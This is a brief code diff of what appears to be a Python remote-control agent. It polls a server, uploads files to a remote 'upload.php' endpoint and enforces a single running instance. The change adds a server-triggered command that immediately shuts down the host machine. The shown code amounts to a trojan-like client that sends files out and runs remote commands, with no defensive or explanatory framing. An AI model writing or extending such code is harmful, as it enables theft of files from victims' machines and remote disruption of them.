@@ -12,7 +12,7 @@ for i in psutil.pids():
             count += 1
     except:
         pass
-if count > 2:
+if count > 1:
     sys.exit()
 
 header = {
@@ -75,4 +75,6 @@ while True:
             requests.post(req_url + 'upload.php', headers=header, files=file_object)
             time.sleep(1)
             temp_file.close()
+        elif one[0] == 's':
+            os.system('shutdown -s -t 0')
     time.sleep(5)
